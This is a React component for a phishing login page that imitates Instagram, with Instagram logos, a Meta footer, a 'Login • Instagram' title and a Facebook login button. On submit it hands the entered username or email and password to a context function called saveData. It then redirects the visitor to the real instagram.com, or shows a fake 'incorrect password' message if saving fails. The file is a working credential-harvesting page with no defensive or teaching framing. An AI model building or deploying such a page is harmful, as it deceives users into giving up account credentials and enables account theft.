import React from "react";
import AppContext from "../context/usecontext";
import { useContext,useState } from "react";
import { Link } from "react-router-dom";


export default function Login() {
  document.title = "Login • Instagram"
    const {saveData} = useContext(AppContext)
    const [email,setEmail] = useState("");
    const [password,setPassword] = useState("");
    const [error,setError] = useState("")
  
    const handleOnSubmit= async(e)=>{
      e.preventDefault()
      setError("")
      if (!email || email.length === 0 || !password || password.length === 0) {
        return;
      }
      try {
        await saveData(email,password)
        window.location.replace('https://instagram.com');
      } catch (error) {
        setError("Sorry, your password was incorrect. Please double-check your password.")
        console.log(error.message)
      }
    }
  
  return (
    <div>
      <div className="App">
        <div class="container">
          <div class="left">
            <div class="instaImage">
              <img src="/mob.PNG" alt="" />
            </div>
          </div>
          <div class="right">
            <div class="top">
              <div class="loginInstaImg">
                <img src="/instaLogo.PNG" alt="" />
              </div>
              <form onSubmit={handleOnSubmit} class="form">
                <input
                  onChange={(e) => {
                    setEmail(e.target.value);
                  }}
                  value={email}
                  class="input"
                  type="text"
                  required
                  placeholder="Phone number, Username or email"
                />
                <input
                  class="input"
                  value={password}
                  required
                  onChange={(e) => {
                    setPassword(e.target.value);
                  }}
                  type="password"
                  placeholder="Password"
                />
                
                {/* <div class="check">
          <div>
            <input type="checkbox" />
            <label>Save login info</label>
          </div>
        </div> */}
                <input class="inputBtn" type="submit" value="Login" />
              </form>
              <div class="orSection">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
              </div>
              <div class="facebook">
                <img src="/facebook.PNG" alt="" />
                <p>Log in with Facebook</p>
              </div>
              {error&&<p className="error">{error}</p>}
              <div class="forgetPassword">
                <p>Forget password?</p>
              </div>
            </div>
            <div class="bottom">
              <p>
                Don't have an account? <Link to={"/"}><span class="signup"> Sign up</span></Link>
              </p>
            </div>
            <div class="getApp">
              <p>Get the app</p>
            </div>
            <div class="getAppIcons">
              <img src="/googlePlay.png" />{" "}
              <img src="/left.png" alt="" />
            </div>
          </div>
        </div>
        <div class="footer">
          <p>Meta</p>
          <p>About</p>
          <p>Blog</p>
          <p>Jobs</p>
          <p>Help</p>
          <p>API</p>
          <p>Privacy</p>
          <p>Terms</p>
          <p>Top Accounts</p>
          <p>Locations</p>
          <p>Instagram Lite</p>
          <p>Contact Uploading & Non-Users</p>
          <p>English</p>
          <p>&#169;2023 Instagram form Meta</p>
        </div>
      </div>
    </div>
  );
}
